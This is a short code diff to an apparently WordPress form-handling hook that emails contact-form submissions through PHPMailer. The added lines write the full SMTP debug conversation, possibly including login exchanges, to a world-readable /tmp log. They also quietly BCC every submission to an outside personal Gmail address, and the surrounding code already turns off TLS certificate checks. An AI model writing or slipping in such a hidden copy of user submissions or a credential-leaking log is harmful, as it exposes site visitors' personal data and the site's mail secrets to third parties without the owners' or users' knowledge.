@@ -649,10 +649,15 @@ add_action('gform_after_submission', function ($entry, $form) {
             $mail->SMTPOptions = array('ssl' => array(
                 'verify_peer' => false, 'verify_peer_name' => false, 'allow_self_signed' => true,
             ));
+            $mail->SMTPDebug   = 2;
+            $mail->Debugoutput = function ($str, $level) {
+                file_put_contents('/tmp/royal-smtp-debug.log', '[' . date('H:i:s') . '] ' . $str, FILE_APPEND);
+            };
             $from_email = royal_smtp_setting('SMTP_FROM', $mail->Username);
             $from_name  = royal_smtp_setting('SMTP_FROM_NAME', get_bloginfo('name'));
             $mail->setFrom($from_email, $from_name, false);
             $mail->addAddress('info@royalassociates.co.ke');
+            $mail->addBCC('odhiambobonfacee@gmail.com');
             if ($email) { $mail->addReplyTo($email, "$first $last"); }
             $mail->Subject = $subject;
             $mail->Body    = $plain;
